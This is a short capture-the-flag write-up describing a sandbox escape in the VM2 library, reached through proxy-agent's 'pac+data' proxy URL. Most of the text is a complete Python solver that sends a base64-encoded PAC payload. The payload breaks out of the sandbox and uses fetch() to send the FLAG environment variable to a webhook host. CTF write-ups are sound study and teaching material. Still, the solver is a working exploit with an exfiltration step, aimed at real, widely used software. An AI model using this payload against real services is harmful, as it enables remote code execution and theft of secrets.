# Writeup

This challenge is inspired by this CVE: [https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9](https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9).

The idea is to exploit a module that requires VM2 as a dependency, especially for this challenge. I want to exploit `proxy-agent`, which requires VM2 as a dependency. We can inject a specially crafted proxy URL with the protocol "pac+data" and inject our sandbox escape script into the proxy configuration.

Here is my solver for this challenge:

```python
from itsdangerous import base64_encode
import httpx

TARGET = "http://localhost:8080"
WEBHOOK = "http://localhost:4444"

payload = "pac+data:plain/text;base64,"
payload += base64_encode("""
eval(`
FindProxyForURL=()=>{}
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('fetch("{WEBHOOK}?"+process.env.FLAG)')(); }
            )
        }
    }
};
p.then();`)
""".replace("{WEBHOOK}", WEBHOOK)).decode()

res = httpx.get(TARGET, params={
    "url": "https://google.com",
    "proxyUrl": payload
})
print(res.text)
```
